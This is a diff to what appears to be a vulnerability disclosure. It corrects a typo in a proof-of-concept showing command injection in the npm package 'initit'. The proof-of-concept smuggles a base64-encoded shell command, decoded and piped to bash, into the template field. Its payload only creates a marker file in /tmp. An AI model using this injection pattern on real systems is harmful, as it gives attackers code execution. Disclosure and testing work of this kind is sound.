@@ -7,5 +7,5 @@ The following code is the proof of concept.
 const initit = require("initit")
 
 // touch /tmp/initit_rce
-initit({name: "xxx",template: "`echo dG91Y2ggL3RtcC9pbml0aXRfcmNl | base64 -d | bash`/bbb"})f
+initit({name: "xxx",template: "`echo dG91Y2ggL3RtcC9pbml0aXRfcmNl | base64 -d | bash`/bbb"})
 ```
